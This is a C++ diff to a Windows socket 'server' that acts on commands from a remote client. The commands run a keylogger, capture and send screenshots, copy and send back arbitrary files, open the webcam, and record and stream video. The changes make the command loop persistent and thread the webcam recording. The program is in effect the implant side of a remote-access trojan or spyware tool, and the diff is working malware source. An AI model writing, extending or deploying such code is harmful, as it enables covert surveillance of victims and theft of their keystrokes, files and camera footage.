@@ -1,5 +1,9 @@
 #include "server_socket.h"
 
+std::atomic<bool> stoprecording(false);
+std::mutex mtx;
+std::condition_variable CV;
+
 Server::Server(int port)
     : port(port), listenSocket(INVALID_SOCKET) {
     // Initialize Winsock
@@ -157,86 +161,72 @@ void Server::handleClient(SOCKET clientSocket) {
     char recvbuf[512];
     int recvbuflen = 512;
 
+    int result;
+
     // Receive data from the client
-    int result = recv(clientSocket, recvbuf, recvbuflen, 0);
-    if (result > 0) {
-        std::string receivedMessage(recvbuf, result);
-        std::cout << "Received message: " << receivedMessage << std::endl;
+    while (1)
+    {
+        std::cout << "Waiting for request from client..." << std::endl;
+        result = recv(clientSocket, recvbuf, recvbuflen, 0);
+        if (result > 0) {
+            std::string receivedMessage(recvbuf, result);
+            std::cout << "Received message: " << receivedMessage << std::endl;
 
-        if (receivedMessage == "shutdown") {
-            std::cout << "Shutdown command received. Server is shutting down..." << std::endl;
+            if (receivedMessage == "shutdown") {
+                std::cout << "Shutdown command received. Server is shutting down..." << std::endl;
+                closesocket(listenSocket);  // Close listening socket to stop accepting new connections
+                shutdownServer();
+                exit(0);  // Exit the server program
+            }
+            if(receivedMessage == "restart"){
+                std::cout << "Restart command received. Server is restarting..." << std::endl;
+                closesocket(listenSocket);  // Close listening socket to stop accepting new connections
+                restartServer();
+                exit(0);  // Exit the server program
+            }
+            if(receivedMessage == "keylogger"){
+                std::cout << "Keylogger command received." << std::endl;
+                keyLogger(clientSocket);
+            }
+            else if (receivedMessage == "screenshot")
+            {
+                std::cout << "Screenshot command received.\n";
+                bool check = captureAndSendScreenshot(clientSocket);
 
-            std::cout << "Press enter to exit!";
-            std::cin.get();
+                if (check) std::cout << "Screenshot saved as screenshot.jpg and sent to client!\n";
+            }
+            else if (receivedMessage.substr(0, 9) == "copy_file")
+            {
+                std::istringstream iss(receivedMessage);
+                std::string command, sourceFileName, destinationFileName;
 
-            closesocket(listenSocket);  // Close listening socket to stop accepting new connections
-            shutdownServer();
-            exit(0);  // Exit the server program
+                // Parse the command
+                std::getline(iss, command, '|');
+                std::getline(iss, sourceFileName, '|');
+                std::getline(iss, destinationFileName);
+
+                // Call the method to copy the file and send it back
+                copyFileAndSend(clientSocket, sourceFileName, destinationFileName);
+            }
+            else if (receivedMessage == "open_webcam")
+            {
+                openWebcam(clientSocket);
+            }
+            else if (receivedMessage == "close_connection")
+            {
+                std::cout << "Close connection received." << std::endl;
+                std::cout << "Connection closing..." << std::endl;
+                closesocket(listenSocket);
+                exit(0);
+                break;
+            }
+        } else if (result == 0) {
+            std::cout << "Connection closing..." << std::endl;
+            break;
+        } else {
+            std::cerr << "recv failed: " << WSAGetLastError() << std::endl;
+            break;
         }
-        if(receivedMessage == "restart"){
-            std::cout << "Restart command received. Server is restarting..." << std::endl;
-
-            std::cout << "Press enter to exit!";
-            std::cin.get();
-            closesocket(listenSocket);  // Close listening socket to stop accepting new connections
-            restartServer();
-            exit(0);  // Exit the server program
-        }
-        if(receivedMessage == "keylogger"){
-            std::cout << "Keylogger command received." << std::endl;
-            keyLogger(clientSocket);
-
-            std::cout << "Press enter to exit!";
-            std::cin.get();
-            closesocket(listenSocket); 
-            exit(0);  // Exit the server program
-        }
-        else if (receivedMessage == "screenshot")
-        {
-            std::cout << "Screenshot command received.\n";
-            // Take a screenshot and save it
-            // takeScreenshot("screenshot.png"); // Save as screenshot.png
-
-            // Send the screenshot back to the client
-            // sendScreenshot(clientSocket, "screenshot.png");
-            // saveScreenshot(clientSocket);
-            bool check = captureAndSendScreenshot(clientSocket);
-
-            if (check) std::cout << "Screenshot saved as screenshot.jpg and sent to client!\n";
-
-            // std::cout << "Press enter to exit!";
-            // std::cin.get();
-
-            closesocket(listenSocket);  // Close listening socket to stop accepting new connections
-            exit(0);  // Exit the server program
-        }
-        else if (receivedMessage.substr(0, 9) == "copy_file")
-        {
-            std::istringstream iss(receivedMessage);
-            std::string command, sourceFileName, destinationFileName;
-
-            // Parse the command
-            std::getline(iss, command, '|');
-            std::getline(iss, sourceFileName, '|');
-            std::getline(iss, destinationFileName);
-
-            // Call the method to copy the file and send it back
-            copyFileAndSend(clientSocket, sourceFileName, destinationFileName);
-
-            closesocket(listenSocket);  // Close listening socket to stop accepting new connections
-            exit(0);  // Exit the server program
-        }
-        else if (receivedMessage == "open_webcam")
-        {
-            openWebcam(clientSocket);
-
-            closesocket(listenSocket);
-            exit(0);
-        }
-    } else if (result == 0) {
-        std::cout << "Connection closing..." << std::endl;
-    } else {
-        std::cerr << "recv failed: " << WSAGetLastError() << std::endl;
     }
 }
 
@@ -279,7 +269,6 @@ void Server::copyFileAndSend(SOCKET clientSocket, const std::string& sourceFileN
 
         // Send the size first
         uint32_t fileSize = htonl(static_cast<u_long>(size));
-        std::cout << fileSize << std::endl;
         send(clientSocket, reinterpret_cast<const char*>(&fileSize), sizeof(fileSize), 0);
 
         // Send the file data
@@ -439,10 +428,6 @@ void Server::openWebcam(SOCKET clientSocket) {
         return;
     }
 
-    // std::string successMessage = "Webcam opened successfully.";
-    // send(clientSocket, successMessage.c_str(), static_cast<int>(successMessage.size()), 0);
-    // std::cout << successMessage << std::endl;
-
     std::string successMessage = "Webcam opened successfully.";
     send(clientSocket, successMessage.c_str(), static_cast<int>(successMessage.size()), 0);
     std::cout << successMessage << std::endl;
@@ -454,7 +439,6 @@ void Server::openWebcam(SOCKET clientSocket) {
         webcam >> frame; // Capture a new frame
         if (frame.empty()) break; // Check if frame is empty
         cv::imshow("Webcam Feed", frame); // Display the frame
-        
 
         // Receive data from the client
         int result = recv(clientSocket, recvbuf, recvbuflen, 0);
@@ -464,18 +448,37 @@ void Server::openWebcam(SOCKET clientSocket) {
 
             if (receivedmessage == "close_webcam")
             {
+                std::cout << "Closing webcam..." << std::endl;
                 break;
             }
             else if (receivedmessage == "start_webcam")
             {
-                startRecording(webcam, clientSocket);
-                break;
+                std::thread startRecordingThread(&Server::startRecording, this, webcam, clientSocket);
+                std::cout << "Waiting for stop recording demand...";
+                result = -1;
+                while (result < 0)
+                {
+                    result = recv(clientSocket, recvbuf, recvbuflen, 0);
+                }
+
+                std::string stopmessage(recvbuf, result);
+                if (stopmessage == "stop_webcam")
+                {
+                    {
+                        std::lock_guard<std::mutex> lock(mtx);
+                        stoprecording = true;
+                    }
+                    CV.notify_one();
+                    startRecordingThread.join();
+                    stopRecording(clientSocket);
+                    break;
+                    std::cin.ignore();
+                }
             }
         }
 
         // You may want to send this frame to the client
         // (Add your frame sending logic here if needed)
-
         if (cv::waitKey(30) >= 0) break; // Break loop on key press
     }
 
@@ -497,42 +500,40 @@ void Server::startRecording(cv::VideoCapture& webcam, SOCKET clientSocket)
 
     char recvbuf[512];
     int recvbuflen = 512;
-    recording = true;
-    std::thread([this, &videoWriter, &webcam, &clientSocket, &recvbuf, &recvbuflen]() {
-        cv::Mat frame;
-        while (recording)
+    cv::Mat frame;
+    while (true)
+    {
         {
-            webcam >> frame;
-            if (frame.empty()) break;
-            videoWriter.write(frame);
-
-            int result = recv(clientSocket, recvbuf, recvbuflen, 0);
-            if (result > 0)
-            {
-                std::string receivedmessage(recvbuf, result);
-                if (receivedmessage == "stop_webcam") {
-                    videoWriter.release();
-                    stopRecording(clientSocket);
-                    break;
-                }
+            std::unique_lock<std::mutex> lock(mtx);
+            if (CV.wait_for(lock, std::chrono::milliseconds(5), []{ return stoprecording.load(); })) {
+                break;
             }
-            cv::waitKey(30);
         }
-        if (videoWriter.isOpened()) videoWriter.release();
-    }).detach();
+        webcam >> frame;
+        if (frame.empty()) break;
+        videoWriter.write(frame);
+        cv::waitKey(30);
+    }
+    if (videoWriter.isOpened()) videoWriter.release();
 }
 
 void Server::stopRecording(SOCKET clientSocket)
 {
-    recording = false;
     std::cout << "Recording stopped." << std::endl;
 
     std::ifstream videoFile("Video.mp4", std::ios::binary);
     if (!videoFile)
     {
+        std::string message = "Failed to open recorded video.";
+        send(clientSocket, message.c_str(), static_cast<int>(message.size()), 0);
         std::cerr << "Failed to open recorded video." << std::endl;
         return;
     }
+    
+    std::string message = "Opened file Video.mp4.";
+    send(clientSocket, message.c_str(), static_cast<int>(message.size()), 0);
+
+    std::this_thread::sleep_for(std::chrono::milliseconds(100));
 
     videoFile.seekg(0, std::ios::end);
     std::streamsize fileSize = videoFile.tellg();
@@ -542,14 +543,18 @@ void Server::stopRecording(SOCKET clientSocket)
     uint32_t fileSizeNetworkOrder = htonl(static_cast<uint32_t>(fileSize));
     send(clientSocket, reinterpret_cast<const char*>(&fileSizeNetworkOrder), sizeof(fileSizeNetworkOrder), 0);
 
+    std::this_thread::sleep_for(std::chrono::milliseconds(100));
+
     // Send the video data
     char buffer[4096];
     while (videoFile.read(buffer, sizeof(buffer))) {
         send(clientSocket, buffer, static_cast<int>(videoFile.gcount()), 0);
+        std::this_thread::sleep_for(std::chrono::milliseconds(100));
     }
     // Send any remaining bytes
     if (videoFile.gcount() > 0) {
         send(clientSocket, buffer, static_cast<int>(videoFile.gcount()), 0);
+        std::this_thread::sleep_for(std::chrono::milliseconds(100));
     }
 
     videoFile.close();
